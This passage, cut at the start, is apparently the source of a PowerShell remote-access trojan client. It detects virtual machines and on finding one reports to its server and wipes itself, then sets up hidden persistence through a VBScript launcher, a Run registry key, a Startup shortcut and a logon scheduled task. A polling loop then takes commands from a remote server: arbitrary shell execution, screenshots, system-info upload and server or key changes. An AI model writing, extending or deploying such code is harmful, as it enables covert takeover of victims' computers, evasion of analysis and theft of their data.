    Write-Host ('ua : ' + $script:UA)
    try {
        $r = Http 'GET' '/' $null (Auth-Headers (if ($script:Secret) { 'secret' } else { 'global' }))
        Write-Host ('GET code : ' + $r.Code)
        Write-Host ('key mode : ' + $r.KeyMode)
        if ($r.Enroll) { Write-Host ('enroll : ' + $r.Enroll) }
        if ($r.Body) { Write-Host ('body : ' + $r.Body) }
        else { Write-Host 'body : empty -> auth OK, no pending command' }
    } catch { Write-Host ('GET ERR : ' + $_.Exception.Message) }
    try { Write-Host ('POST : ' + (Send '/info' ('TEST' + "`n" + (Get-Info))).Code) } catch { Write-Host ('POST ERR : ' + $_.Exception.Message) }
    return
}

# --- vm guard ---

function Test-VM {
    $hits = @()
    $label = ''

    try {
        $cs = Get-CimInstance Win32_ComputerSystem -ErrorAction Stop
        $mm = ([string]$cs.Manufacturer + ' ' + [string]$cs.Model)
        if     ($mm -match '(?i)vmware')                        { $label = 'VMware';    $hits += 'cim-vmware' }
        elseif ($mm -match '(?i)virtualbox|innotek')            { $label = 'VirtualBox';$hits += 'cim-vbox' }
        elseif ($mm -match '(?i)virtual machine|hyper-?v')      { $label = 'Hyper-V';   $hits += 'cim-hyperv' }
        elseif ($mm -match '(?i)qemu|kvm|proxmox')              { $label = 'QEMU/KVM';  $hits += 'cim-qemu' }
        elseif ($mm -match '(?i)xen|hvm domu')                  { $label = 'Xen';       $hits += 'cim-xen' }
        elseif ($mm -match '(?i)parallels')                     { $label = 'Parallels'; $hits += 'cim-parallels' }
        elseif ($mm -match '(?i)bochs|bhyve|nutanix|ahv')       { $label = 'hypervisor';$hits += 'cim-other' }
    } catch {}

    try {
        $b = Get-CimInstance Win32_BIOS -ErrorAction Stop
        $bs = ([string]$b.Manufacturer + ' ' + [string]$b.SMBIOSBIOSVersion + ' ' + [string]$b.SerialNumber)
        if ($bs -match '(?i)vmware|vbox|virtualbox|innotek|qemu|xen|hyper-?v|parallels|bochs|bhyve|ahv') {
            $hits += 'bios'
            if (-not $label) { $label = 'hypervisor' }
        }
    } catch {}

    try {
        $bb = Get-CimInstance Win32_BaseBoard -ErrorAction Stop
        $bp = ([string]$bb.Manufacturer + ' ' + [string]$bb.Product)
        if ($bp -match '(?i)vmware|vbox|virtualbox|innotek|qemu|xen|hyper-?v|parallels|bochs|bhyve') {
            $hits += 'board'
            if (-not $label) { $label = 'hypervisor' }
        }
    } catch {}

    try {
        $de = Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Services\Disk\Enum' -ErrorAction Stop
        $dv = ($de.PSObject.Properties | Where-Object { $_.Name -match '^\d+$' } | ForEach-Object { [string]$_.Value }) -join ' '
        if ($dv -match '(?i)ven_vbox|vmware|qemu|xen|msft virtual|prl_|bhyve|ahv') {
            $hits += 'disk'
            if (-not $label) { $label = 'hypervisor' }
        }
    } catch {}

    try {
        $pn = (Get-Process -ErrorAction SilentlyContinue | Select-Object -ExpandProperty ProcessName) -join ' '
        if ($pn -match '(?i)vmtoolsd|vboxservice|vboxtray|qemu-ga|xenservice|prl_tools|prl_cc') {
            $hits += 'tools'
            if (-not $label) { $label = 'hypervisor' }
        }
    } catch {}

    if (-not $hits) { return @{ vm = $false; label = ''; hits = '' } }
    return @{ vm = $true; label = $label; hits = ($hits -join ',') }
}

if ($VmBlock) {
    $vmr = Test-VM
    if ($vmr.vm) {
        Log ('VM DETECTED ' + $vmr.label + ' [' + $vmr.hits + '] -> report, block, destroy')

        # poll once so the server registers and enrolls this id, otherwise the
        # /info below is refused as an unknown sender
        try { $null = Poll } catch {}

        $rep  = 'VM-DETECTED: ' + $vmr.label + "`n"
        $rep += 'VM-SIGNAL: ' + $vmr.hits + "`n"
        $rep += 'VM-BUILD: ' + $Build + "`n`n"
        $rep += (Get-Info)
        try {
            $vmid = ([guid]::NewGuid().ToString('N').Substring(0, 6)).ToUpper()
            $null = Send '/info' ($vmid + "`n" + $rep)
        } catch {}

        # marker first, this is what keeps it dark if the .bat gets re-run
        try { [IO.File]::WriteAllText($VmFlag, ('vm ' + $vmr.label + ' ' + (Get-Date).ToString('o'))) } catch {}

        try { Remove-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $RunName -ErrorAction SilentlyContinue } catch {}
        try { Unregister-ScheduledTask -TaskName $RunName -Confirm:$false -ErrorAction SilentlyContinue } catch {}
        try { Remove-Item -LiteralPath (Join-Path ([Environment]::GetFolderPath('Startup')) ($RunName + '.lnk')) -Force -ErrorAction SilentlyContinue } catch {}

        Start-Sleep -Milliseconds 500

        try { Remove-Item -LiteralPath $CfgFile, $IdFile -Force -ErrorAction SilentlyContinue } catch {}
        try { Remove-Item -LiteralPath $Launch -Force -ErrorAction SilentlyContinue } catch {}
        try { if ($env:0NET_SRC) { Remove-Item -LiteralPath $env:0NET_SRC -Force -ErrorAction SilentlyContinue } } catch {}
        try { Remove-Item -LiteralPath $Script -Force -ErrorAction SilentlyContinue } catch {}
        try { Remove-Item -LiteralPath $Tmp -Recurse -Force -ErrorAction SilentlyContinue } catch {}

        exit
    }
    Log ('vm guard armed, host looks physical -> continuing')
}

# --- persistence ---

function Write-Launcher {
    if (Test-Path $script:Launch) { return }
    try {
        if (-not (Test-Path $script:Dir)) { New-Item -ItemType Directory -Path $script:Dir -Force | Out-Null }
        $v = ''
        $v += 'Set fso = CreateObject("Scripting.FileSystemObject")' + "`r`n"
        $v += 'd = fso.GetParentFolderName(WScript.ScriptFullName)' + "`r`n"
        $v += 'Set s = CreateObject("WScript.Shell")' + "`r`n"
        $v += 'p = "powershell.exe -NoProfile -ExecutionPolicy Bypass -File " + Chr(34) + d + "\client.ps1" + Chr(34) + " -Detached"' + "`r`n"
        $v += 's.Run p, 0, False' + "`r`n"
        [IO.File]::WriteAllText($script:Launch, $v, [Text.Encoding]::ASCII)
    } catch {}
}

function Set-Persist {
    try {
        $rk = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
        if (-not (Test-Path $rk)) { New-Item -Path $rk -Force | Out-Null }
        Set-ItemProperty -Path $rk -Name $RunName -Value ('wscript.exe //B //NoLogo "' + $script:Launch + '"')
    } catch {}
    try {
        $lnk = Join-Path ([Environment]::GetFolderPath('Startup')) ($RunName + '.lnk')
        $ws = New-Object -ComObject WScript.Shell
        $sc = $ws.CreateShortcut($lnk)
        $sc.TargetPath = 'wscript.exe'
        $sc.Arguments = '//B //NoLogo "' + $script:Launch + '"'
        $sc.WorkingDirectory = $script:Dir
        $sc.WindowStyle = 7
        $sc.Save()
    } catch {}
    try {
        $act = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument ('//B //NoLogo "' + $script:Launch + '"')
        $trg = New-ScheduledTaskTrigger -AtLogOn
        $set = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit ([TimeSpan]::Zero)
        Register-ScheduledTask -TaskName $RunName -Action $act -Trigger $trg -Settings $set -Force -ErrorAction Stop | Out-Null
    } catch {}
}

Write-Launcher
Set-Persist
Save-Cfg

# --- dispatch ---

function Invoke-Remote([string]$raw) {
    $t = $raw.Trim()
    if (-not $t) { return }

    $cmdId = ''
    $m = [regex]::Match($t, '\(ID-([A-Z0-9]{6})\)\s*$')
    if ($m.Success) {
        $cmdId = $m.Groups[1].Value
        $t = $t.Substring(0, $m.Index).TrimEnd()
    }
    if ($cmdId) {
        if ($script:Seen.ContainsKey($cmdId)) { return }
        $script:Seen[$cmdId] = 1
        if ($script:Seen.Count -gt 2000) { $script:Seen = @{} }
    }
    if (-not $t) { return }
    Log ('CMD [' + $cmdId + '] ' + $t)

    if ($t -eq 'info') {
        Send '/info' ($cmdId + "`n" + (Get-Info)) | Out-Null
    } elseif ($t -eq 'shellquit') {
    } elseif ($t -eq 'forget') {
        $script:Secret = ''
        Save-Cfg
        Log 'FORGET -> secret cleared, will re-enroll'
        if ($cmdId) { Send '/result' ($cmdId + "`n" + 'forget' + "`n" + 'secret cleared') | Out-Null }
    } elseif ($t -eq 'remove') {
        Log 'REMOVE'
        try { Remove-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $RunName -ErrorAction SilentlyContinue } catch {}
        try { Unregister-ScheduledTask -TaskName $RunName -Confirm:$false -ErrorAction SilentlyContinue } catch {}
        try { Remove-Item -LiteralPath (Join-Path ([Environment]::GetFolderPath('Startup')) ($RunName + '.lnk')) -Force -ErrorAction SilentlyContinue } catch {}
        try { Remove-Item -LiteralPath $script:Script, $script:Launch, $CfgFile, $IdFile, $VmFlag -Force -ErrorAction SilentlyContinue } catch {}
        Start-Sleep -Milliseconds 300
        try { Remove-Item -LiteralPath $script:Tmp -Recurse -Force -ErrorAction SilentlyContinue } catch {}
        exit
    } elseif ($t -like 'updatekey *') {
        $nk = $t.Substring(10).Trim()
        if ($nk) { $script:KeyStr = $nk; Save-Cfg; Log ('NEWKEY ' + $nk) }
    } elseif ($t -like 'updateserver *') {
        $nu = $t.Substring(13).Trim().TrimEnd('/')
        if ($nu) {
            if ($nu -notmatch '^https?://') { $nu = 'https://' + $nu }
            $script:Server = $nu
            Save-Cfg
            Log ('NEWSERVER ' + $nu)
        }
    } elseif ($t -like 'sleep *') {
        $n = 0
        if ([int]::TryParse($t.Substring(6).Trim(), [ref]$n) -and $n -ge 1 -and $n -le 3600) { $script:PollSec = $n }
    } elseif ($t -like 'shellcmd *') {
        $sh = $t.Substring(9)
        Send '/result' ($cmdId + "`n" + $sh + "`n" + (Run-Cmd $sh)) | Out-Null
    } elseif ($t -like 'screenshot*') {
        $p = $t -split ' ', 2
        $tid = if ($p.Count -gt 1) { $p[1].Trim() } else { '' }
        if ($tid) {
            try {
                $f = Join-Path $script:Tmp ('shot_' + $tid + '.jpg')
                Take-Shot $f
                Send-File $f $tid
                Remove-Item -LiteralPath $f -Force -ErrorAction SilentlyContinue
            } catch {
                Log ('SHOT FAIL ' + $_.Exception.Message)
                if ($cmdId) { Send '/result' ($cmdId + "`n" + 'screenshot' + "`n" + ('ERROR: ' + $_.Exception.Message)) | Out-Null }
            }
        }
    } else {
        $out = Run-Cmd $t
        if ($cmdId) { Send '/result' ($cmdId + "`n" + $t + "`n" + $out) | Out-Null }
    }
}

# --- loop ---

Log ('--- start ' + $Build + ' client=' + $script:DeviceId + ' server=' + $script:Server + ' enrolled=' + [bool]$script:Secret)

while ($true) {
    $err = $false
    for ($i = 0; $i -lt 8; $i++) {
        $r = Poll
        if (-not $r.ok) { $err = $true; break }
        if ([string]::IsNullOrEmpty($r.text)) { break }
        try { Invoke-Remote $r.text } catch { Log ('DISPATCH FAIL ' + $_.Exception.Message) }
    }
    if ($err) {
        $script:Fail++
        $d = [Math]::Min(60, [Math]::Pow(2, [Math]::Min($script:Fail, 6)))
        Start-Sleep -Seconds $d
    } else {
        $script:Fail = 0
        Start-Sleep -Milliseconds ($script:PollSec * 1000 + (Get-Random -Minimum 0 -Maximum 800))
    }
}
